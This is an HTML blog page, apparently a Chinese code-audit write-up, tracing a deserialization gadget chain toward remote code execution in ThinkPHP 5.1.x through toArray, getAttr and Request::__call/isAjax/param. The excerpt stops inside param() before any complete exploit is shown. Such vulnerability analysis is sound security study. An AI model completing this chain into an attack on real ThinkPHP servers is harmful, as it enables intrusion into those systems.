@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="ki10Moc" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      ThinkPHP5.1.xRCE漏洞 
+      
+      
+      |
+    
+     ki10Moc&#39;s World
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/1.png">
+    <link rel="icon" href="/images/1.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RG82N8DQZ9"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-RG82N8DQZ9');
+    </script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="ki10Moc's World" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">ki10Moc</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">ki10Moc</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">ThinkPHP5.1.xRCE漏洞</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2023-01-12 00:29:17
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                    <b>#</b> 代码审计
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/thinkphp%E6%A1%86%E6%9E%B6/" title="thinkphp框架">
+                    <b>#</b> thinkphp框架
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言</h2>
+<p>整个流程理解上可能不是很复杂，但我感觉想把整个 exp 写下来还是有点复杂的，中间 debug 的过程还是需要花时间去考究的。</p>
+<h2 id="代码审计"><a class="markdownIt-Anchor" href="#代码审计">#</a> 代码审计</h2>
+<p>入口点依然是 <code>windows.php</code>  下的 <code>__destruct</code></p>
+<p><img src="https://img-blog.csdnimg.cn/000ee35d7ec348a79180a3a4cf45a49c.png" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[Pure</span>(<span class="literal">true</span>)<span class="meta">]</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_exists</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$filename</span></span>): <span class="title">bool</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>
+<p><code>file_exists</code>  会将文件名当做字符串，这里接着寻找 <code>__toString</code>  方法<br>
+在 5.0 版本是在 <code>Model</code>  类<br>
+在 5.1 版本是在 <code>Conversion</code>  类</p>
+<p>一路跟进到 <code>toArray</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$item</span>       = [];</span><br><span class="line">        <span class="variable">$hasVisible</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;visible <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)      = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                    <span class="variable">$hasVisible</span>          = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;hidden <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)     = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 合并关联数据</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                    <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;hidden[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                    <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">hidden</span>(<span class="variable">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) || <span class="literal">true</span> !== <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>() : [];</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>([<span class="variable">$attr</span>]);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>() : [];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>, <span class="variable">$item</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$item</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>其中我们来看这段</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>() : [];</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>([<span class="variable">$attr</span>]);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里按照之前 5.0 的写法看，这里的几个参数都是可控的<br>
+ <code>getRelation</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里我们是可以返回空<br>
+并且 <code>append</code>  是可控的</p>
+<p><code>getAttr</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="variable">$name</span>, &amp;<span class="variable">$item</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$notFound</span> = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable">$value</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$name</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="variable">$notFound</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$value</span>    = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/b16fd37204ff41b1a70e4090d9b49cbe.png" alt="在这里插入图片描述"><br>
+这里通过 <code>data[]</code>  返回后续利用类的对象 (Request)</p>
+<p>在 5.0 中我们说这里的几个调用方法可以触发 <code>__call</code>  方法<br>
+这里我们选择则 <code>visible</code>  来触发 <code>__call</code> <br>
+ 找下可以利用的方法<br>
+在 <code>Request</code>  中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$method</span>, <span class="variable">$this</span>-&gt;hook)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$args</span>, <span class="variable">$this</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;hook[<span class="variable">$method</span>], <span class="variable">$args</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;method not exists:&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$method</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>首先会判断方法中有没有设置 <code>hook</code> ，然后把 <code>this</code>  关键字放在之执行参数的前面，所以这里对于方法是不可控的<br>
+所以在该类下寻找可以后续利用的方法</p>
+<p><code>isAjax</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span>(<span class="params"><span class="variable">$ajax</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$value</span>  = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;xmlhttprequest&#x27;</span> == <span class="title function_ invoke__">strtolower</span>(<span class="variable">$value</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$ajax</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span>           = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">param</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;var_ajax&#x27;</span>]) ? <span class="literal">true</span> : <span class="variable">$result</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里的配置信息是可控的</p>
+<p><img src="https://img-blog.csdnimg.cn/1079e48ea5b94e07b0abddc40deeb246.png" alt="在这里插入图片描述"><br>
+接着跟进 <code>param</code></p>
+<p><code>param</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">method</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$method</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PATCH&#x27;</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(<span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;param = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">  